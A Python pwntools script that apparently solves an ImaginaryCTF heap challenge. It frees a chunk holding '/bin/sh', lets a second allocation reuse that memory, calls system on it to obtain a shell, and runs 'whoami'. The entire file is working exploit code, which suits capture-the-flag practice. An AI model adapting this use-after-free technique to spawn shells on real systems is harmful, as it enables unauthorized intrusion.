from pwn import *

r = remote("chal.imaginaryctf.org", 42003)
# for i in range(0,7):
r.recvuntil('1: Malloc\n2: Free\n3: Fill a\n4: System b\n> ')
r.sendline("1")
r.recvuntil("What do I malloc?\n(1) a\n(2) b\n>> ")
r.sendline("1")
r.recvuntil("1: Malloc\n2: Free\n3: Fill a\n4: System b\n> ")
r.sendline("3")
r.recvuntil(">> ")
r.sendline("/bin/sh")
r.recvuntil("1: Malloc\n2: Free\n3: Fill a\n4: System b\n> ")
r.sendline("2")
r.recvuntil("What do I free?\n(1) a\n(2) b\n>> ")
r.sendline("1")
r.recvuntil("1: Malloc\n2: Free\n3: Fill a\n4: System b\n> ")
r.sendline("1")
r.recvuntil("What do I malloc?\n(1) a\n(2) b\n>> ")
r.sendline("2")
r.recvuntil("1: Malloc\n2: Free\n3: Fill a\n4: System b\n> ")
r.sendline("4")
r.sendline("whoami")
print(r.recvline())
r.close()